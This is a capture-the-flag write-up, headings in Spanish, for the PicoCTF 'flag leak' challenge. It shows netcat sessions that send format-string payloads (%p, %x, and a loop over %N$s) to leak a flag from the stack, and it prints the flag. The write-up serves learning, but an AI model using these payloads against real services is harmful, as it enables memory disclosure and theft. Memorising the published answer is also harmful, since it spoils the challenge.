# flag leak

## Objetivo

Story telling class 1/2

Additional details will be available after launching your challenge instance.

## Hints

## Solución

```     
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ nc saturn.picoctf.net 62376
Tell me a story and then I'll tell you one >> %p %p %p %p
Here's a story - 
0xffca5a00
                                                                           
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ nc saturn.picoctf.net 62376
Tell me a story and then I'll tell you one >> %x%x%x%x
Here's a story - 
ffc1fe10ffc1fe30804934678257825
                                                                           
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 62376 ; done
Tell me a story and then I'll tell you one >> Here's a story - 
%0$s
Tell me a story and then I'll tell you one >> Here's a story - 
%1$s
Tell me a story and then I'll tell you one >> Here's a story - 
��
Tell me a story and then I'll tell you one >> Here's a story - 
�ú,
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 62376 | grep -Ei pico ; done 
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
^C
                                                                           
┌──(kali㉿kali)-[~/Documents/PicoCTF]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 62376 | grep -Ei (pico|ctf) ; done
CTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}

```

## Flag

picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}

## Notas adicionales

## Referencias

[man](https://man7.org/linux/man-pages/man3/printf.3.html)